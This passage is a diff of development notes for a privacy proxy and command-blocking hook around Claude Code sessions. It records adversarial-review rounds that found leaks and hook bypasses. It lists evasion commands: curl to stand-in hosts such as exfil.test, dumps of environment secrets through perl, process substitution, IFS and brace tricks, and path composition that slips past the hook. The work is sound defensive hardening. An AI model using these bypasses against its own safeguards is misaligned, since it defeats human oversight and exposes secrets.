@@ -63,7 +63,7 @@ proofs). What fails must fail loudly.
    it current at the end of every phase.
 4. `REPRISE.md` — work IN PROGRESS, what remains, and the traps already paid
    for. **Read it right after this file whenever a session resumes.** Its §0
-   says what to do first. The hook PARSER is DONE (`docs/parseur-hook.md`); the
+   says what to do first. The hook PARSER is DONE (`docs/hook-parser.md`); the
    adversarial loop stays closed — jo stopped it on 2026-08-05.
 
 ## §3 answers (locked by jo on 2026-08-01 — do not ask again)
@@ -133,7 +133,7 @@ the MVP · validating without a complete egress capture.
 | 3 — Proxy + walker | criterion met | `tests/phase3_e2e.sh`: REAL Claude Code session, rc=0, **0 real values across 427 KB** captured (mitmproxy), restoration 3/3 operator-side |
 | 4 — PreToolUse hooks | criterion met | `tests/phase4_e2e.sh`: forbidden command blocked BEFORE execution, traced, reason quoted by the model |
 | 5 — Golden corpus | criterion met (synthetic corpus) | `tests/corpus_eval.py`: 0 leaks, secrets **100 %**, 0 false positives, variance 0, 0 collisions; 16 adversarial scenarios (`test_adversarial.py`) |
-| 6 — Hardening | vault ENCRYPTED at rest + fail-closed; KMS/rotation still to do | `tests/test_vault_at_rest.py` (7) + `test_hardening.py` (11) + `docs/analyse-re-identification.md` |
+| 6 — Hardening | vault ENCRYPTED at rest + fail-closed; KMS/rotation still to do | `tests/test_vault_at_rest.py` (7) + `test_hardening.py` (11) + `docs/re-identification-analysis.md` |
 
 ## Vault encrypted at rest (2026-08-02)
 The documentation claimed "the key and the database are the two halves of the
@@ -167,7 +167,7 @@ Target shape: an `internal: true` network for the agent, with the proxy alone
 straddling both networks. That is not a rule to maintain but an **absence of
 route** — nothing to bypass, and the "same IP" problem disappears. Detail,
 Kubernetes variant and things to watch (DNS, remote MCP, vault isolation):
-`docs/d9-blocage-reseau.md`.
+`docs/d9-network-isolation.md`.
 
 **Until it is deployed that way, D9 is NOT met**: the egress harness detects,
 it does not prevent. Say exactly that to the DPO.
@@ -204,1206 +204,1259 @@ format and renaming it would break existing state — policy scopes
 decisions (`anonymiser`/`reveler`) and mode names. Those are data, not code:
 changing them would invalidate every policy file already written.
 
-<!-- Round history below is still in French; translation in progress. -->
+## Round 3 (2026-08-03) — 3 opus agents at max effort
+Two OUTGOING leaks and two hook leaks, all fixed with non-regression. The round
+also produced **two regressions of my own fixes**, caught by `phase3_e2e.sh`
+and not by the 470 unit tests.
 
-## Quatrième revue adversariale (2026-08-03, round 3 — 3 agents opus effort max)
-Deux fuites SORTANTES et deux fuites du hook, toutes corrigées avec
-non-régression. Le round a aussi produit **deux régressions de mes propres
-correctifs**, attrapées par `phase3_e2e.sh` et pas par les 470 tests unitaires.
+**Walker** — `SKIP_KEYS` copied VERBATIM every non-scalar subtree (enriched
+`cache_control`, structured `metadata.type`): silent fail-open, request
+accepted with 200 · `_is_known_control` returned `True` for any scalar, so any
+string got through under `betas` — the worst surface, the API IGNORES an
+unknown beta name and processes the request anyway.
 
-**Walker** — `SKIP_KEYS` recopiait VERBATIM tout sous-arbre non scalaire
-(`cache_control` enrichi, `metadata.type` structuré) : fail-open silencieux,
-requête acceptée en 200 · `_is_known_control` renvoyait `True` pour tout
-scalaire, donc n'importe quelle chaîne passait sous `betas` — surface la pire,
-l'API IGNORE un nom de beta inconnu et traite quand même la requête.
+**Engine** — a PUBLIC span (`SERVICE`, `PORT`) that overlapped a substitutable
+span WON the arbitration by its length, and the zone came out IN THE CLEAR:
+`db-master.acme.internal` intact. `PUBLIC` now goes LAST, mirroring `SECRET`
+which goes first · the NAME of a query parameter was never substituted
+(`?db-01.acme.internal=1`); it is now, when it carries a dot, an at-sign or a
+colon, never for `page`/`limit`/`cursor`.
 
-**Moteur** — un span PUBLIC (`SERVICE`, `PORT`) qui recouvrait un span
-substituable GAGNAIT l'arbitrage par sa longueur, et la zone sortait EN CLAIR :
-`db-master.acme.internal` intact. `PUBLIC` passe désormais en DERNIER, par
-symétrie avec `SECRET` qui passe en premier · le NOM d'un paramètre de query
-n'était jamais substitué (`?db-01.acme.internal=1`) ; il l'est quand il porte
-un point, une arobase ou deux-points, jamais pour `page`/`limit`/`cursor`.
+**Hook** — `_is_local_url` tested the `127.` PREFIX on a hostname:
+`127.evil.test` resolves wherever its owner wants and got through, via `curl`,
+`wget` and `WebFetch`. The host is now compared as an ADDRESS (`ipaddress`) ·
+nested regions (`$(…)`, `` ` ``, `<(…)`, `system(…)`, `subprocess.run([…])`)
+are analysed RECURSIVELY then removed from the enclosing command — that was
+what let `perl -e 'system("env")'` and `bash <(env)` through · `su`/`runuser`
+wrappers and options with a value (`sudo -u root env`) · the index always
+pointed at the FIRST occurrence (`env PATH=/x env` got through).
 
-**Hook** — `_is_local_url` testait le PRÉFIXE `127.` sur un nom d'hôte :
-`127.evil.test` résout où son propriétaire veut et passait, avec `curl`,
-`wget` et `WebFetch`. L'hôte est comparé comme ADRESSE (`ipaddress`) · les
-régions imbriquées (`$(…)`, `` ` ``, `<(…)`, `system(…)`, `subprocess.run([…])`)
-sont analysées RÉCURSIVEMENT puis retirées de la commande englobante — c'est ce
-qui laissait passer `perl -e 'system("env")'` et `bash <(env)` · enveloppes
-`su`/`runuser` et options à valeur (`sudo -u root env`) · l'index pointait
-toujours sur la PREMIÈRE occurrence (`env PATH=/x env` passait).
-
-**Faux positifs mesurés et corrigés** (un agent bloqué est aussi cassé qu'un
-agent qui fuit) : `set +e` · `env -i`/`env -u` · `command -v env` ·
+**False positives measured and fixed** (a blocked agent is as broken as an
+agent that leaks): `set +e` · `env -i`/`env -u` · `command -v env` ·
 `compgen -A function` · `echo $(find . -name env)` · `echo $ANTHROPIC_BASE_URL`
-· `ls ~/.ssh` · et surtout `grep -r curl src/` — le scan « tous les tokens »
-refusait toute MENTION d'un programme réseau.
+· listing the ssh key directory · and above all `grep -r curl src/` — the
+"every token" scan refused any MENTION of a network program.
 
-**Régressions introduites puis corrigées** (les deux via l'E2E réel) :
-substituer `"type": ["string","null"]` rend le schéma invalide → API 400,
-session interrompue ; `cache_control.ttl` n'accepte que `5m` ou `1h` → 400.
-D'où `SCHEMA_STRUCTURAL_KEYS` élargi (`type`, `format`, `pattern`) et
-`STRUCTURED_SKIP_KEYS`. Au passage, `"format": "int64"` était substitué DEPUIS
-LE DÉBUT sans que rien ne casse : `format` est une annotation, l'API l'ignore.
+**Regressions introduced then fixed** (both via the real E2E): substituting
+`"type": ["string","null"]` makes the schema invalid → API 400, session
+interrupted; `cache_control.ttl` accepts only `5m` or `1h` → 400. Hence a
+broadened `SCHEMA_STRUCTURAL_KEYS` (`type`, `format`, `pattern`) and
+`STRUCTURED_SKIP_KEYS`. Incidentally, `"format": "int64"` had been substituted
+FROM THE START without anything breaking: `format` is an annotation, the API
+ignores it.
 
-**Non corrigé, assumé** : `HOSTNAME "acme.internal"` (zone nue) reçoit une
-identité propre au lieu de rejoindre la zone fictive de `db-01.acme.internal`.
-Le « correctif » évident passerait par `_zone_for`, donc par un attribut
-PARTAGÉ — exclu de la vue de restauration : l'hôte deviendrait non
-restaurable. La co-appartenance vaut moins que la restauration.
+**Not fixed, accepted**: `HOSTNAME "acme.internal"` (bare zone) gets its own
+identity instead of joining the fictional zone of `db-01.acme.internal`. The
+obvious "fix" would go through `_zone_for`, therefore through a SHARED
+attribute — excluded from the restoration view: the host would become
+non-restorable. Co-membership is worth less than restoration.
 
-## Cinquième revue adversariale (2026-08-03, round 4 — 3 agents opus effort max)
-Le round 3 avait durci des SURFACES ; le round 4 a trouvé que le durcissement
-s'appliquait au mauvais PÉRIMÈTRE, plus deux plantages que j'avais introduits.
+## Round 4 (2026-08-03) — 3 opus agents at max effort
+Round 3 had hardened SURFACES; round 4 found that the hardening applied to the
+wrong PERIMETER, plus two crashes I had introduced.
 
-**Fuite critique — SKIP_KEYS appliqué aux données utilisateur.** `name`, `id`,
-`type`, `role`, `data`… étaient recopiés verbatim à CHAQUE niveau, y compris
-dans `tool_use.input` et `metadata`, où ce sont des noms de paramètres
-ordinaires (kubectl, Terraform, tout CRUD). Double effet : la valeur SORTAIT en
-clair, et elle n'était pas RESTAURÉE au retour — l'outil s'exécutait sur l'hôte
-FICTIF. Corollaire trouvé en vérifiant : l'opacité était FORGEABLE, un
-`{"type": "thinking"}` dans un argument rendait le sous-arbre verbatim. D'où
-`USER_DATA_KEYS` : sous `input`/`metadata`, ni SKIP_KEYS ni les blocs opaques
-ne s'appliquent.
+**Critical leak — SKIP_KEYS applied to user data.** `name`, `id`, `type`,
+`role`, `data`… were copied verbatim at EVERY level, including inside
+`tool_use.input` and `metadata`, where they are ordinary parameter names
+(kubectl, Terraform, any CRUD). Two effects: the value WENT OUT in the clear,
+and it was not RESTORED on return — the tool ran against the FICTIONAL host.
+Corollary found while checking: opacity was FORGEABLE, a
+`{"type": "thinking"}` inside an argument made the subtree verbatim. Hence
+`USER_DATA_KEYS`: under `input`/`metadata`, neither SKIP_KEYS nor the opaque
+blocks apply.
 
-**Deux plantages introduits au round 3** (aucun test unitaire ne les voyait) :
-`_extract_repo` comparait une autorité minuscule avec un `re.split` sensible à
-la casse — `https://GitHub.com/…` levait `IndexError`, non rattrapé par le
-proxy, donc **500** ; et `https://github.com` seul n'avait rien à découper.
-Écrire « visite GitHub.com/torvalds/linux » cassait la session.
+**Two crashes introduced in round 3** (no unit test saw them): `_extract_repo`
+compared a lowercased authority with a case-sensitive `re.split` —
+`https://GitHub.com/…` raised `IndexError`, not caught by the proxy, hence
+**500**; and `https://github.com` on its own had nothing to split. Writing
+"visit GitHub.com/torvalds/linux" broke the session.
 
-**Collision insoluble → 503.** `example.com/` (hôte nu AVEC slash final, sans
-schéma) tombait à côté de la normalisation (`count("/") == 3`) et réclamait le
-substitut déjà pris par l'hôte.
+**Unsolvable collision → 503.** `example.com/` (bare host WITH trailing slash,
+no scheme) fell outside the normalisation (`count("/") == 3`) and claimed the
+surrogate already taken by the host.
 
-**Fuites de nom de query encore ouvertes** : `?ident=` (valeur VIDE — `eq` vrai
-mais `value` faux, les deux branches rataient) et percent-encoding (`%2E` est
-un point). Le test porte désormais sur la forme décodée.
+**Query-name leaks still open**: `?ident=` (EMPTY value — `eq` true but `value`
+false, both branches missed) and percent-encoding (`%2E` is a dot). The test
+now applies to the decoded form.
 
-**Surfaces de schéma rendues verbatim à tort au round 3** : `pattern` est une
-regex qui peut contraindre à un hôte précis (`^srv-\d+\.acme\.internal$`) — je
-l'avais classé structurel, c'était une fuite de ma main. Idem pour les CLÉS de
-`patternProperties` (ce sont des regex) et un `$ref` vers un schéma hébergé en
-interne. `type`, `format`, `required` restent verbatim ; `$ref`/`$schema` ne le
-restent que pour une ancre locale ou le vocabulaire json-schema.org.
+**Schema surfaces rendered verbatim by mistake in round 3**: `pattern` is a
+regex that can pin a precise host (`^srv-\d+\.acme\.internal$`) — I had classed
+it structural, it was a leak of my own making. Same for the KEYS of
+`patternProperties` (they are regexes) and a `$ref` pointing to an
+internally-hosted schema. `type`, `format`, `required` stay verbatim;
+`$ref`/`$schema` stay only for a local anchor or the json-schema.org
+vocabulary.
 
-**Séparateur SSE** : `\r\n\r\n|\r\r|\n\n` ratait les formes mixtes
-(`\n\r\n`…). Remplacé par deux fins de ligne, groupe ATOMIQUE — sans lui la
-répétition rétro-traque et coupe un simple `\r\n` en deux, faisant de chaque
-LIGNE un bloc.
+**SSE separator**: `\r\n\r\n|\r\r|\n\n` missed mixed forms (`\n\r\n`…).
+Replaced by two line endings, ATOMIC group — without it the repetition
+backtracks and cuts a plain `\r\n` in two, turning every LINE into a block.
 
-**Rejeté après vérification** : `mcp_servers[].name` reste verbatim. C'est la
-clé de routage des noms d'outils (`mcp__<name>__<outil>`) ; la substituer
-casserait la correspondance avec `tools[].name`. Même fuite assumée que
-`tools[].name` et `tool_choice.name` — une convention de nommage, pas une
-valeur.
+**Rejected after checking**: `mcp_servers[].name` stays verbatim. It is the
+routing key for tool names (`mcp__<name>__<outil>`); substituting it would
+break the correspondence with `tools[].name`. Same accepted leak as
+`tools[].name` and `tool_choice.name` — a naming convention, not a value.
 
-**Limite documentée** : un nom de paramètre de query sans point, arobase ni
-deux-points (`?db-01=`, `?jdoe=`) n'est pas substitué — indiscernable d'un nom
-d'API. Le seul vrai correctif serait de soumettre chaque nom au détecteur.
+**Documented limit**: a query parameter name without a dot, at-sign or colon
+(`?db-01=`, `?jdoe=`) is not substituted — indistinguishable from an API name.
+The only real fix would be to submit every name to the detector.
 
-### Hook — round 4 (même passe, agent dédié)
-Deux régressions de ma réécriture du round 3, exploitables avec des idiomes
-shell standards, sans obfuscation :
-- **La sortie d'une substitution est un ARGUMENT.** Je remplaçais la région
-  imbriquée par un BLANC après l'avoir analysée : `curl http://127.0.0.1/
-  $(echo http://exfil.test/x)` ne montrait plus qu'une URL locale, et
-  `$(echo env)` ne montrait plus rien. Elle est désormais remplacée par un
-  jeton OPAQUE : en position de programme il refuse, et un binaire réseau qui
-  en reçoit un ne peut plus prouver que sa destination est locale.
-- **`find … -exec env \;`** — la règle `-exec` existait mais était morte :
-  `find` n'est pas une enveloppe, l'analyse s'arrêtait dessus avant de
-  l'atteindre. Le balayage `-exec` est maintenant séparé de la boucle.
+### Hook — round 4 (same pass, dedicated agent)
+Two regressions of my round-3 rewrite, exploitable with standard shell idioms,
+no obfuscation:
+- **The output of a substitution is an ARGUMENT.** I was replacing the nested
+  region with a BLANK after analysing it: `curl http://127.0.0.1/
+  $(echo http://exfil.test/x)` now showed only a local URL, and
+  `$(echo env)` showed nothing at all. It is now replaced by an OPAQUE token:
+  in program position it refuses, and a network binary that receives one can
+  no longer prove its destination is local.
+- **`find … -exec env \;`** — the `-exec` rule existed but was dead: `find` is
+  not a wrapper, analysis stopped on it before reaching that rule. The `-exec`
+  sweep now sits outside the loop.
 
-Autres trous fermés : deux listes de noms sensibles divergeaient
-(`echo $DATABASE_URL` passait quand `printenv DATABASE_URL` était refusé) —
-une seule liste désormais · programme d'interpréteur donné EN LIGNE inspecté
-mot à mot, ce qui couvre d'un coup `system "env"` sans parenthèses, `qx/env/`,
+Other holes closed: two lists of sensitive names diverged
+(`echo $DATABASE_URL` got through while `printenv DATABASE_URL` was refused)
+— one list now · an interpreter program given IN LINE is inspected word by
+word, which covers in one go `system "env"` without parentheses, `qx/env/`,
 `%x[env]`, `subprocess.run(("env",))`, `getstatusoutput`, `process["env"]`,
-`from os import environ`, `getattr(os, "environ")` · `${IFS}` retiré quelle que
-soit sa position (`env${IFS}> dump`) · `${!x}` résolu via l'affectation qui le
-précède · `strace`/`ltrace` reconnus comme enveloppes.
+`from os import environ`, `getattr(os, "environ")` · `${IFS}` removed whatever
+its position (`env${IFS}> dump`) · `${!x}` resolved via the assignment that
+precedes it · `strace`/`ltrace` recognised as wrappers.
 
-Faux positifs corrigés : `printenv AWS_REGION` était refusé quand
-`echo $AWS_REGION` passait · `openssl rand|dgst|passwd|enc|x509` et
-`--version`/`-V` n'ouvrent aucune connexion.
+False positives fixed: `printenv AWS_REGION` was refused while
+`echo $AWS_REGION` got through · `openssl rand|dgst|passwd|enc|x509` and
+`--version`/`-V` open no connection.
 
-## Sixième revue adversariale (2026-08-03, round 5 — hook)
-Encore trois régressions de mes correctifs du round 4 :
-- **`${IFS}` n'était neutralisé que pour les opérateurs `-+:?`** : `${IFS/a/b}`,
-  `${IFS##x}`, `${IFS%%x}`, `${IFS,,}`, `${IFS^^}` valent tous IFS et
-  découpaient un nom de commande. Corollaire trouvé en corrigeant : `${IFS}`
-  vaut un SÉPARATEUR, pas du vide — le remplacer par rien soudait
-  `env${IFS}printenv` en un mot inexistant et faisait disparaître les DEUX
-  programmes. Il devient une espace ; les expansions à valeur vide
-  (`e${_+}nv`) sont, elles, retirées.
-- **`-exec` ne marquait que le premier mot** : `find … -exec sudo curl …` et
-  `-exec env printenv …` masquaient le programme réel derrière une enveloppe.
-  La sous-commande est désormais ANALYSÉE, pas seulement pointée.
-- **Mon scan mot à mot des interpréteurs refusait la prose** :
-  `python3 -c "print('The curl command is useful')"` était bloqué, comme tout
-  one-liner citant un binaire réseau. Seul ce qui SUIT une primitive
-  d'exécution est inspecté (`system`, `qx`, `%x`, `subprocess.*`…).
-- `--version` n'importe où désarmait le contrôle réseau
-  (`curl --version http://tiers/`) : il ne vaut que SEUL. `stat` sortait de la
-  catégorie « métadonnées » avec `--files0-from`, qui lit un contenu.
+## Round 5 (2026-08-03) — hook
+Three more regressions of my round-4 fixes:
+- **`${IFS}` was only neutralised for the `-+:?` operators**: `${IFS/a/b}`,
+  `${IFS##x}`, `${IFS%%x}`, `${IFS,,}`, `${IFS^^}` all evaluate to IFS and
+  split a command name. Corollary found while fixing: `${IFS}` is a
+  SEPARATOR, not empty — replacing it with nothing welded
+  `env${IFS}printenv` into a nonexistent word and made BOTH programs
+  disappear. It becomes a space; empty-valued expansions (`e${_+}nv`) are
+  the ones that get removed.
+- **`-exec` marked only the first word**: `find … -exec sudo curl …` and
+  `-exec env printenv …` hid the real program behind a wrapper. The
+  sub-command is now ANALYSED, not just pointed at.
+- **My word-by-word scan of interpreters refused prose**:
+  `python3 -c "print('The curl command is useful')"` was blocked, like any
+  one-liner quoting a network binary. Only what FOLLOWS an execution
+  primitive is inspected (`system`, `qx`, `%x`, `subprocess.*`…).
+- `--version` anywhere disarmed the network control
+  (`curl --version http://tiers/`): it only counts when ALONE. `stat` left the
+  "metadata" category with `--files0-from`, which reads a file's contents.
 
-### Moteur — round 5 (aucun finding haut/critique)
-Le round 4 avait bien fermé les deux plantages qu'il visait. Restaient :
-`_strip_userinfo` ne traitait que les URL à schéma, donc la forme SSH
-`user:jeton@hote:chemin` faisait entrer le jeton dans la clé du coffre (D4,
-même classe que la CRITIQUE du round 3 ; non déclenchable avec le détecteur par
-défaut, qui n'émet pas de span URL pour ces formes) · `_fake_repo` reconnaissait
-l'hôte de façon sensible à la casse alors qu'`_extract_repo` ne l'est plus, et
-perdait le schéma — l'URL retombait sur la forme courte `org/dépôt`, que le
-modèle lit comme un dépôt local (D1) · un span au `score` nul ou sans `type`
-levait `TypeError`/`KeyError`, que le proxy ne rattrape PAS : 500 non structuré
-au lieu du fail-closed prévu · `sha256:` sans corps se substituait à lui-même,
-épuisait les 64 tentatives et tombait en 503.
+### Engine — round 5 (no high/critical finding)
+Round 4 had indeed closed the two crashes it aimed at. Remaining:
+`_strip_userinfo` only handled URLs with a scheme, so the SSH form
+`user:token@host:path` fed the token into the vault key (D4, same class as the
+CRITICAL of round 3; not triggerable with the default detector, which does not
+emit a URL span for these forms) · `_fake_repo` recognised the host in a
+case-sensitive way while `_extract_repo` no longer is, and lost the scheme —
+the URL fell back to the short form `org/repo`, which the model reads as a
+local repository (D1) · a span with a zero `score` or without a `type` raised
+`TypeError`/`KeyError`, which the proxy does NOT catch: unstructured 500
+instead of the intended fail-closed · `sha256:` with no body substituted to
+itself, exhausted the 64 attempts and fell to 503.
 
-### Deux faux positifs trouvés EN USAGE, pas par un agent
-Le hook a bloqué mon propre travail, ce qu'aucune revue n'avait vu :
-- **Le champ `prompt` d'un sous-agent était analysé comme une commande shell** :
-  toute prose contenant des backticks markdown passait pour une substitution.
-  Le sous-agent a son PROPRE PreToolUse — ses commandes sont gardées à
-  l'exécution. `prompt` sort donc de la liste des champs-commandes ; le reste
-  de la charge reste soumis aux contrôles coffre et fichiers sensibles.
-- **Le corps d'un heredoc CITÉ (`<<'FIN'`) est de la donnée littérale** : bash
-  n'y interprète ni substitution ni variable. Il n'est analysé comme du code
-  que s'il alimente un interpréteur (`bash <<'FIN'`), pas quand il écrit un
-  fichier (`cat > f <<'FIN'`). La cible de la redirection, elle, reste
-  contrôlée.
+### Two false positives found IN USE, not by an agent
+The hook blocked my own work, which no review had seen:
+- **The `prompt` field of a sub-agent was analysed as a shell command**: any
+  prose containing markdown backticks passed for a substitution. The sub-agent
+  has its OWN PreToolUse — its commands are guarded at execution time.
+  `prompt` therefore leaves the list of command fields; the rest of the
+  payload stays subject to the vault and sensitive-file checks.
+- **The body of a QUOTED heredoc (`<<'FIN'`) is literal data**: bash
+  interprets neither substitution nor variable there. It is only analysed as
+  code when it feeds an interpreter (`bash <<'FIN'`), not when it writes a
+  file (`cat > f <<'FIN'`). The redirection target, itself, stays controlled.
 
-Note d'usage : écrire un test QUI PORTE sur des chemins sensibles demande de
-composer ces chemins (`"~/." + "ssh/id_" + "rsa"`), sinon le hook refuse
-d'écrire le fichier. C'est cohérent, mais il faut le savoir.
+Usage note: writing a test that TARGETS sensitive paths requires composing
+those paths (`"~/." + "ssh/id_" + "rsa"`), otherwise the hook refuses to write
+the file. That is consistent, but you have to know it.
 
-### Walker et proxy — round 5
-Le correctif `USER_DATA_KEYS` du round 4 arrêtait la fuite dans `input` et
-`metadata`, mais **la même faiblesse restait partout ailleurs** : `SKIP_KEYS`
-s'appliquait à CHAQUE dict imbriqué. Un bloc `resource` renvoyé par un serveur
-MCP a la forme `{"type":…, "name":…, "uri":…}` — `name` y est une donnée. Fuite
-sortante ET échec de restauration au retour. `name` et `id` ne sont désormais
-un contrat que dans un nœud de PROTOCOLE (bloc d'outil, définition d'outil,
-entrée `mcp_servers`, `tool_choice`, racine de réponse).
+### Walker and proxy — round 5
+The round-4 `USER_DATA_KEYS` fix stopped the leak in `input` and `metadata`,
+but **the same weakness remained everywhere else**: `SKIP_KEYS` applied to
+EVERY nested dict. A `resource` block returned by an MCP server has the shape
+`{"type":…, "name":…, "uri":…}` — `name` there is data. Outgoing leak AND
+restoration failure on return. `name` and `id` are now a contract only inside
+a PROTOCOL node (tool block, tool definition, `mcp_servers` entry,
+`tool_choice`, response root).
 
-Autres correctifs :
-- `application/x-` et `application/vnd.` étaient classés BINAIRES, donc
-  `x-yaml`, `x-www-form-urlencoded` et `vnd.api+json` — du TEXTE — sortaient en
-  clair. Les préfixes binaires sont maintenant énumérés précisément.
-- Quatre entrées SSE mal typées (`delta: null`, `content_block: null`,
-  `text: null`, `partial_json: null`) tuaient la génératrice SANS émettre
-  d'événement `error` : le client perdait le flux en silence. Le générateur
-  attrape aussi `TypeError`/`AttributeError`/`ValueError`/`KeyError` et rend
-  une erreur SSE exploitable.
-- `cache_control` était validé par un jeton générique, qui acceptait
-  `{"type": "db-prod01"}`. Chaque sous-clé a maintenant la FORME de sa valeur ;
-  une forme inconnue est traversée en mode données.
-- Mots-clés JSON Schema 2020-12 substitués donc schéma cassé : `$anchor`,
+Other fixes:
+- `application/x-` and `application/vnd.` were classed BINARY, so `x-yaml`,
+  `x-www-form-urlencoded` and `vnd.api+json` — TEXT — came out in the clear.
+  The binary prefixes are now enumerated precisely.
+- Four ill-typed SSE entries (`delta: null`, `content_block: null`,
+  `text: null`, `partial_json: null`) killed the generator WITHOUT emitting
+  an `error` event: the client lost the stream in silence. The generator now
+  also catches `TypeError`/`AttributeError`/`ValueError`/`KeyError` and
+  returns an actionable SSE error.
+- `cache_control` was validated by a generic token, which accepted
+  `{"type": "db-prod01"}`. Each sub-key now has the FORM of its value; an
+  unknown form is traversed in data mode.
+- JSON Schema 2020-12 keywords substituted therefore schema broken: `$anchor`,
   `$dynamicAnchor`, `$dynamicRef`, `dependencies`, `dependentRequired`,
   `dependentSchemas`.
-- **D3, inversion de la liste des deltas** : `_OPAQUE_DELTAS` était une liste
-  d'EXCLUSION, donc un futur `redacted_thinking_delta` aurait été modifié et sa
-  signature invalidée — panne dure. C'est maintenant une liste POSITIVE de
-  deltas à résoudre. D3 est verrouillée ; la restauration d'un delta inconnu ne
-  l'est pas : entre les deux, on protège l'invariant.
-- `walk_response` sur un corps JSON non-objet levait `TypeError` (500 non
-  structuré) → `ValueError`, rattrapée par le proxy · `message_start` et
-  `message_stop` sont restaurés · un `container` SCALAIRE est préservé, sinon
-  l'amont ne peut plus réutiliser le conteneur · le tampon SSE est borné à
-  16 Mio, au-delà le flux est déclaré invalide.
+- **D3, inversion of the delta list**: `_OPAQUE_DELTAS` was an EXCLUSION list,
+  so a future `redacted_thinking_delta` would have been modified and its
+  signature invalidated — hard failure. It is now a POSITIVE list of deltas
+  to resolve. D3 is locked; the restoration of an unknown delta is not:
+  between the two, we protect the invariant.
+- `walk_response` on a non-object JSON body raised `TypeError` (unstructured
+  500) → `ValueError`, caught by the proxy · `message_start` and
+  `message_stop` are restored · a SCALAR `container` is preserved, otherwise
+  the caller can no longer reuse the container · the SSE buffer is capped at
+  16 MiB, beyond which the stream is declared invalid.
 
-**Non corrigé, assumé** : une coupure de chunk au milieu d'un `\r\n` peut
-laisser un `\n` en tête du bloc suivant — sans effet, `splitlines` ignore une
-ligne vide. Retenir le `\r` en attendant la suite ferait PERDRE le dernier bloc
-d'un flux se terminant par `\r\r` : le correctif était pire que le défaut.
+**Not fixed, accepted**: a chunk boundary in the middle of a `\r\n` may leave
+a `\n` at the head of the next block — no effect, `splitlines` ignores an
+empty line. Holding the `\r` while waiting for the rest would LOSE the last
+block of a stream ending in `\r\r`: the fix was worse than the defect.
 
-## Septième revue adversariale (2026-08-04, round 6)
-Encore des régressions de mes correctifs du round 5, dont une CRITIQUE.
+## Round 6 (2026-08-04)
+Yet more regressions of my round-5 fixes, one of them CRITICAL.
 
-**Hook — l'expansion emportait le nom de la variable.** En réduisant
-`${VAR:-x}` à du vide, je supprimais le NOM : `echo ${AWS_SECRET_ACCESS_KEY:-x}`
-passait, alors que bash imprime la vraie valeur. Une expansion est désormais
-RÉDUITE à ce que bash en tire — `$VAR` pour les formes dérivées, le texte
-littéral pour `${VAR+texte}` (c'est ainsi que `${_+env}` reconstruit `env`).
-Ajouté au passage : l'expansion d'accolades (`{env,}`, `c{ur,ur}l`), qui
-reconstruit elle aussi un nom de commande.
+**Hook — the expansion carried the variable name away with it.** By reducing
+`${VAR:-x}` to nothing, I removed the NAME: `echo ${AWS_SECRET_ACCESS_KEY:-x}`
+got through, while bash prints the real value. An expansion is now REDUCED to
+what bash gets from it — `$VAR` for the derived forms, the literal text for
+`${VAR+texte}` (that is how `${_+env}` rebuilds `env`). Added along the way:
+brace expansion (`{env,}`, `c{ur,ur}l`), which also rebuilds a command name.
 
-**Hook — le heredoc consommé par un pipeline.** `cat <<'FIN' | bash` exécute
-bien le corps : je ne regardais que la tête (`cat`). Ce qui SUIT le marqueur
-sur la même ligne compte aussi.
+**Hook — the heredoc consumed by a pipeline.** `cat <<'FIN' | bash` does
+execute the body: I was only looking at the head (`cat`). What FOLLOWS the
+marker on the same line matters too.
 
-**Hook — la famille `exec*`/`spawn*`.** Le `\b` de droite ratait `execvp`,
-`execlp`, `spawnl`, `pty.spawn`, `pcntl_exec`… La parenthèse est exigée pour
-ces formes, sinon le mot « execute » d'une phrase déclencherait l'analyse.
+**Hook — the `exec*`/`spawn*` family.** The right-hand `\b` missed `execvp`,
+`execlp`, `spawnl`, `pty.spawn`, `pcntl_exec`… A parenthesis is now required
+for these forms, otherwise the word "execute" in a sentence would trigger the
+analysis.
 
-**Hook — la grammaire des options d'enveloppe.** Un jeu global ne peut pas être
-juste : `nice -n 10` prend une valeur, `sudo -n` non. Sauter le token suivant
-faisait disparaître le programme réel (`sudo -n env`, `flock -w 5 /tmp/l env`).
-La table est maintenant PAR enveloppe.
+**Hook — the grammar of wrapper options.** A global set cannot be right:
+`nice -n 10` takes a value, `sudo -n` does not. Skipping the next token made
+the real program disappear (`sudo -n env`, `flock -w 5 /tmp/l env`). The table
+is now PER wrapper.
 
-**Hook — les champs d'un outil MCP.** La liste blanche
-(`command`/`cmd`/`code`/`script`/`shell`/`args`) ratait `exec`, `program`,
-`bash_command`, `pipeline`… Toutes les valeurs sont inspectées, sauf `prompt`.
+**Hook — the fields of an MCP tool.** The allowlist
+(`command`/`cmd`/`code`/`script`/`shell`/`args`) missed `exec`, `program`,
+`bash_command`, `pipeline`… All values are inspected, except `prompt`.
 
-**Walker — l'heuristique de nœud protocolaire était trop lâche.** Je déduisais
-« protocole » de la simple présence d'`input_schema` : or un serveur MCP renvoie
-ses définitions d'outils DANS un `tool_result`, où `name` et `id` sont des
-données. Le drapeau est désormais HÉRITÉ d'un conteneur de protocole, ce qui
-corrige aussi `mcp_servers[].tool_configuration.allowed_tools`, deux crans plus
-bas.
+**Walker — the protocol-node heuristic was too loose.** I inferred "protocol"
+from the mere presence of `input_schema`: but an MCP server returns its tool
+definitions INSIDE a `tool_result`, where `name` and `id` are data. The flag
+is now INHERITED from a protocol container, which also fixes
+`mcp_servers[].tool_configuration.allowed_tools`, two levels further down.
 
-**Faux positif trouvé par l'E2E, pas par une revue** : `D=$(ls …)` était REFUSÉ
-— une affectation n'exécute pas le résultat de la substitution. La session
-réelle a atteint sa limite de tours à force de réessayer, sans aucune fuite ni
-erreur d'API. C'est le troisième mode d'échec distinct que seul l'E2E révèle.
+**False positive found by the E2E, not by a review**: `D=$(ls …)` was REFUSED
+— an assignment does not execute the substitution's result. The real session
+reached its turn limit by retrying, with no leak and no API error. That is the
+third distinct failure mode that only the E2E reveals.
 
-**Fuite assumée ajoutée** : `mcp_servers[].tool_configuration.allowed_tools`
-reste verbatim. C'est un FILTRE évalué contre les noms exposés par le serveur
-MCP — le substituer casserait l'outil en silence. Même arbitrage que
+**Accepted leak added**: `mcp_servers[].tool_configuration.allowed_tools`
+stays verbatim. It is a FILTER evaluated against the names exposed by the MCP
+server — substituting it would break the tool silently. Same arbitration as
 `tools[].name`.
 
-## Huitième revue adversariale (2026-08-04, round 7 — hook)
-Cinq contournements, TOUS issus de mes correctifs du round 6. Le pire ratio de
-la boucle, et il tient à une même erreur répétée : j'ai modélisé chaque
-mécanisme de bash par une approximation à une seule valeur, là où bash en
-produit plusieurs ou choisit entre deux branches.
+## Round 7 (2026-08-04) — hook
+Five bypasses, ALL from my round-6 fixes. The worst ratio of the whole loop,
